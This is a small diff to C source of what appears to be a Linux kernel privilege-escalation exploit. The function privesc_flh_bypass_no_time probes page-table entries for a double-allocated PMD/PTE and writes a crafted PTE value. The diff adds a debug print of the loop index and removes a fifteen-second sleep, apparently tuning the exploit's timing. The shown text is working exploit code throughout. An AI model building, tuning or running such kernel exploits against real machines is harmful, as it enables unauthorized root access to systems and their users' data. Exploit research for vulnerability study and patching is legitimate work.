@@ -363,6 +363,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 		unsigned long long *test_target_addr = PTI_TO_VIRT(2, 0, i, 0, 0);
 		// pte entry pte[0] should be the PFN+flags for &_pmd_area
 		// if this is the double allocated PTE, the value is PFN+flags, not 0x41
+		printf("%d",i);
 		if (*test_target_addr != 0x41)
 		{
 			printf("[+] confirmed double alloc PMD/PTE\n");
@@ -378,7 +379,6 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 
 		return;
 	}
-	sleep(15);
 	// set new pte value for sanity check
 	*pte_area = 0x0 | 0x8000000000000867;
 
